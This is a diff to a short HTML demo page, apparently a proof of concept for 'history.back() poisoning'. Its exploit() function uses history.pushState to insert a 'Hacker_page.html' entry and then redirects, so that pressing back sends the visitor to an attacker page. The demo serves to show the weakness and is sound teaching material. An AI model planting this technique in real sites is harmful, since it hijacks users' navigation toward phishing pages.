@@ -1,19 +1,21 @@
 <!DOCTYPE html>
 <html>
-
 <head>
     <title>Continue</title>
 </head>
-
 <body>
     <h1> This is History.Back() function Poisoning Example</h1>
     <h3> Click on Continue to see the exploit</h3>
     <a onclick="exploit()" href="example_of_vuln.html">Continue...</a>
+
     <script type="text/javascript">
         function exploit() {
-            history.pushState({ page: 1 }, "Exploit", "https://vulnabhi.github.io/history.poisoning/Hacker_page.html");    
+            // Add 'Hacker_page.html' to the history stack first
+            history.pushState({ page: 1 }, "Hacker_page", "Hacker_page.html");
+
+            // Now redirect to example_of_vuln.html
+            window.location.href = 'example_of_vuln.html';
         }
     </script>
 </body>
-
 </html>
